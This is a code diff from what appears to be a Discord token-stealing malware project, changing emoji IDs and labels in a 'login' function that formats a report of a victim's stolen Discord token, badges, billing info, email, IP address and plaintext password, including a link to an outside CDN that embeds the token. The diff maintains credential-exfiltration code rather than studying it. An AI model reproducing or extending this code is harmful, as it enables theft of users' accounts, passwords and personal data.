@@ -584,32 +584,32 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
+            name: '<a:946246524634009600:990956317101424650> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<:946246524172636161:990956262168617020> Nitro & Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: '<a:946246524524978196:990956270624325662> Billing:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: '<:946246524516581396:990956286189383780> Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
+            name: '<:946246524826968104:990956293919490068> IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:946246524302655501:990956306355593276> Password:',
             value: `\`${password}\``,
             inline: true,
           },
